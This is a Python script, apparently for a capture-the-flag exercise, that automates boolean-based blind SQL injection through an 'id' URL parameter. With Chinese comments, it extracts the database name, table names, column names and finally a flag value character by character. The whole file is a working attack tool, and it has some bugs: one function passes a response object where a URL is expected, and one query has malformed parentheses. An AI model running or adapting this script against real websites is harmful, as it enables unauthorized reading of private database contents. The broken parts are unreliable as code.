'''Bool Type SQL Injection'''
from http import HTTPStatus
from time import ctime
from typing import Optional
import asyncio
import httpx

URL = 'http://7erry.com'
#! 页面回显表明查询成功的标志
SUCCESS_MARK = "query_success"
ASCII_RANGE = range(ord('a'),1+ord('z'))
MAX_RETRY = 3
#! flag的字符范围列表，包括花括号、a-z，数字0-9
STR_RANGE = [123,125] + list(ASCII_RANGE) + list(range(48,58))

async def test(request:str) -> Optional[bool]:
    '''
    test if sql injection code is successfully injected
    '''
    cnt = 0
    result = False
    while cnt < MAX_RETRY:
        try:
            cnt += 1
            resp = httpx.get(request)
        except httpx.ConnectError:
            print(f"[*] Connect Error!\n{ctime()}")
            continue
        except httpx.ConnectTimeout:
            print(f"[*] Timeout Error!\n{ctime()}")
            continue
        except httpx.NetworkError:
            print(f"[*] Network Error\n{ctime()}")
            continue
        except httpx.RequestError:
            print(f"[*] Request Error\n{ctime()}")
            continue
        if cnt == MAX_RETRY:
            print(f"[*] Beyond Max Retry limit\nf{ctime()}")
        break
    if resp and resp.status_code == HTTPStatus.OK and SUCCESS_MARK in resp.text:
        result = True
    return result
async def get_length_of_database() -> Optional[int]:
    '''获取数据库名字长度'''
    i = 1
    while True:
        request = URL + f"?id=1 and length(database())={i}"
        if await test(request):
            return i
        i = i + 1

async def get_database(length_of_database:int) -> Optional[str]:
    '''获取数据库名'''
    name = ""
    for i in range(length_of_database):
        for j in ASCII_RANGE:
            request = URL + f"?id=1 and substr(database(),{i+1},1)='{chr(j)}'"
            if await test(request):
                name += chr(j)
                break
    return name

async def get_number_of_tables(database:str) -> Optional[int]:
    '''获取指定库的表数量'''
    i = 1
    while True:
        request = URL + \
            "?id=1 and (select count(*) from information_schema.tables "+ \
            f"where table_schema='{database}')={i}" 
        if await test(request):
            return i
        i = i + 1

async def get_length_of_tables(database:str,count_of_tables:int) -> Optional[list[int]]:
    '''获取指定库所有表的表名长度'''
    length_list=[]
    for i in range(count_of_tables):
        j = 1
        while True:
            request = URL + \
                "?id=1 and length((select table_name from information_schema.tables "+ \
                f"where table_schema='{database}' limit {i},1))={j}"
            if await test(request):
                length_list.append(j)
                break
            j = j + 1
    return length_list

async def get_tables(database:str,count_of_tables:int,length_list:list[int]) -> Optional[list[str]]:
    '''获取指定库所有表的表名'''
    tables=[]
    for i in range(count_of_tables):
        name = ""
        for j in range(length_list[i]):
            for k in ASCII_RANGE:
                request = URL + \
                    "?id=1 and substr((select table_name from information_schema.tables "+ \
                    f"where table_schema='{database}' limit {i},1),{j+1},1)='{chr(k)}'"
                if await test(request):
                    name = name + chr(k)
                    break
        tables.append(name)
    return tables

async def get_number_of_columns(table:str) -> Optional[int]:
    '''获取指定表的列数量'''
    i = 1
    while True:
        request = httpx.get(
            URL +
            "?id=1 and (select count(*) from information_schema.columns "+
            f"where table_name='{table}')={i}")
        if await test(request):
            return i
        i = i + 1

async def get_length_list_of_columns(
    database:str,
    table:str,
    count_of_column:int
    ) -> Optional[list[int]]:
    '''获取指定库指定表的所有列的列名长度'''
    length_list=[]
    for i in range(count_of_column):
        j = 1
        while True:
            request = URL + \
                "?id=1 and length((select column_name from information_schema.columns " + \
                f"where table_schema='{database}' and table_name='{table}' limit {i},1))={j}"
            if await test(request):
                length_list.append(j)
                break
            j = j + 1
    return length_list

async def get_columns(
    database:str,
    table:str,
    count_of_columns:list[int],
    length_list:list[int]
    ) -> Optional[list[str]]:
    '''获取指定库指定表的所有列名'''
    columns = []
    for i in range(count_of_columns):
        name = ""
        for j in range(length_list[i]):
            for k in ASCII_RANGE:
                request = URL + \
                    "?id=1 and substr((select column_name from information_schema.columns "+ \
                    f"where table_schema='{database}' "+ \
                    f"and table_name='{table}' limit {i},1,{j+1},1='{chr(k)}'"
                if await test(request):
                    name = name + chr(k)
                    break
        columns.append(name)
    return columns

async def get_data(database:str,table:str,column:str,str_list:list[str]) -> Optional[int]:
    '''对指定库指定表指定列爆数据（flag）'''
    j = 1
    while True:
        for i in str_list:
            request = URL + \
                f"?id=1 and substr((select {column} from {database}.{table}),{j},1)='{chr(i)}'"
            if await test(request):
                print(chr(i),end="")
                if chr(i) == "}":
                    print()
                    return 1
                break
        j = j + 1

async def main():
    '''
    Entrance of this program
    '''
    print(f"[*] Begin Sql Injection\n{ctime()}")
    print("[*] Judging the number of tables in the database...")
    database = await get_database(await get_length_of_database())
    count_of_tables = await get_number_of_tables(database)
    print(f"[*] There are {count_of_tables} tables in this database")
    print()
    print("[*] Getting the table name...")
    length_list_of_tables = await get_length_of_tables(database,count_of_tables)
    tables = await get_tables(database,count_of_tables,length_list_of_tables)
    for i in tables:
        print(f"[*] {i}")
    print(f"[*] The table names in this database are : {tables}")
    i = input("[*] Select the table name:")
    if i not in tables:
        print("[*] Error!")
        exit()
    print()
    print(f"[*] Getting the column names in the {i} table......")
    count_of_columns = await get_number_of_columns(i)
    print(f"[*] There are {count_of_columns} tables in the {i} table")
    length_list_of_columns = await get_length_list_of_columns(database,i,count_of_columns)
    columns = await get_columns(database,i,count_of_columns,length_list_of_columns)
    print(f"[*] The column(s) name in {i} table is:{columns}")
    j = input("[*] Select the column name:")
    if j not in columns:
        print("[*] Error!")
        exit()
    print()
    print("[*] Getting the flag......")
    print("[*] The flag is ",end="")
    await get_data(database,i,j,STR_RANGE)
    print(f"[*] Finish SQL Injection\n{ctime()}")

if __name__ == '__main__':
    asyncio.run(main())
